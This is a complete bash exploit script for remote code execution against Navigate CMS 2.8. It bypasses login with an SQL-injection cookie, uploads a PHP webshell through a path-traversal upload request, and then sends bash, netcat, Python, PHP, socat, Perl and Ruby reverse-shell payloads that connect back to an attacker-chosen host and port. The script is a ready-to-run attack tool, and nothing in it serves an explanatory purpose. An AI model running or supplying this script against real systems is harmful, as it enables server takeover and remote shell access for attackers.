#!/bin/bash
# RCE navigate CMS 2.8 for reverse shell

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD_CYAN='\033[1;36m'
NC='\033[0m' # No Color

echo -e "${BOLD_CYAN}"
echo ' ______
(_____ \
 _____) ) _ _ ____   ____ ___   ____
|  ____/ | | |  _ \ / ___) _ \ / _  |
| |    | | | | | | | |  | |_| ( (_| |
|_|     \___/|_| |_|_|   \___/ \___ |
                              (_____|'
echo -e "${CYAN}   Navigate CMS 2.8 RCE by dr14n${NC}"
echo ""

if [ $# -ne 3 ]; then
    echo -e "${RED}[!]${NC} ${YELLOW}Usage: $0 <url> <lhost> <lport>${NC}"
    echo -e "${RED}[!]${NC} ${CYAN}Example: $0 victim.com 192.168.1.100 1337${NC}"
    exit 1
fi

url=$1
lhost=$2
lport=$3

# Get session
echo -e "${BLUE}[*]${NC} ${WHITE}Getting session...${NC}"
sesion=$(curl -s -X POST --url $url/navigate/login.php -b 'navigate-user=\" OR TRUE--%20' -I | grep -E "302|NVSID" | grep Cookie | grep -oE "NVSID_+[a-z0-9]+=[0-9a-z]+;" | awk '{print $2}' FS='=' | head -1 | tr -d ';')

if [ -z "$sesion" ]; then
    echo -e "${RED}[-]${NC} ${RED}Failed to get session${NC}"
    exit 1
fi

echo -e "${GREEN}[+]${NC} ${GREEN}Session: $sesion${NC}"

# Generate random filename
random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1)
file="${random_name}.jpg"

# Create obfuscated webshell with multiple parameter names
echo -e "${BLUE}[*]${NC} ${WHITE}Creating webshell...${NC}"
cat << 'EOF' > $file
<?php
// Obfuscated webshell with multiple parameter options
if(isset($_GET['id'])) { system($_GET['id']); }
elseif(isset($_GET['action'])) { system($_GET['action']); }
elseif(isset($_GET['page'])) { system($_GET['page']); }
elseif(isset($_GET['file'])) { system($_GET['file']); }
elseif(isset($_GET['view'])) { system($_GET['view']); }
elseif(isset($_GET['load'])) { system($_GET['load']); }
elseif(isset($_GET['cmd'])) { system($_GET['cmd']); }
elseif(isset($_GET['exec'])) { system($_GET['exec']); }
?>
EOF

# Upload webshell
echo -e "${BLUE}[*]${NC} ${WHITE}Uploading webshell...${NC}"
upload_result=$(curl -s -X POST -H "Content-Type:multipart/form-data" \
    -F "name=$file" \
    -F "session_id=$sesion" \
    -F "engine=picnik" \
    -F "id=../../../navigate_info.php" \
    -F "file=@$file" \
    --url $url/navigate/navigate_upload.php)

rm -rf $file

# Verify webshell with different parameters
echo -e "${BLUE}[*]${NC} ${WHITE}Verifying webshell...${NC}"
verify=$(curl -s --max-time 5 --url "$url/navigate/navigate_info.php?id=whoami")
if [ -z "$verify" ]; then
    verify=$(curl -s --max-time 5 --url "$url/navigate/navigate_info.php?action=whoami")
fi
if [ -z "$verify" ]; then
    verify=$(curl -s --max-time 5 --url "$url/navigate/navigate_info.php?page=whoami")
fi
if [ -z "$verify" ]; then
    echo -e "${RED}[-]${NC} ${RED}Webshell verification failed${NC}"
    exit 1
fi

echo -e "${GREEN}[+]${NC} ${GREEN}Webshell active: http://$url/navigate/navigate_info.php${NC}"

# Reverse shell payloads with different parameters
echo -e "${BLUE}[*]${NC} ${WHITE}Sending reverse shell payloads...${NC}"

# Parameter list to try
params=("id" "action" "page" "file" "view" "load" "exec")

# Function to send payload with random parameter
send_payload() {
    local payload=$1
    local param=${params[$((RANDOM % ${#params[@]}))]}
    encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/&/%26/g' | sed 's/|/%7C/g' | sed 's/"/%22/g' | sed "s/'/%27/g" | sed 's/\$/%24/g')
    curl -s --max-time 3 --url "$url/navigate/navigate_info.php?$param=$encoded_payload" > /dev/null &
}

# 1. Bash reverse shell
bash_payload="bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'"
send_payload "$bash_payload"

# 2. Netcat reverse shell
nc_payload="nc -e /bin/sh $lhost $lport"
send_payload "$nc_payload"

# 3. Python reverse shell
python_payload="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
send_payload "$python_payload"

# 4. PHP reverse shell
php_payload="php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
send_payload "$php_payload"

# 5. Socat reverse shell
socat_payload="socat TCP:$lhost:$lport EXEC:/bin/sh"
send_payload "$socat_payload"

# 6. Additional Perl reverse shell
perl_payload="perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
send_payload "$perl_payload"

# 7. Additional Ruby reverse shell
ruby_payload="ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$lhost\",\"$lport\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
send_payload "$ruby_payload"

echo -e "${GREEN}[+]${NC} ${GREEN}Reverse shell payloads sent!${NC}"
echo -e "${GREEN}[+]${NC} ${GREEN}Check your listener for connections${NC}"
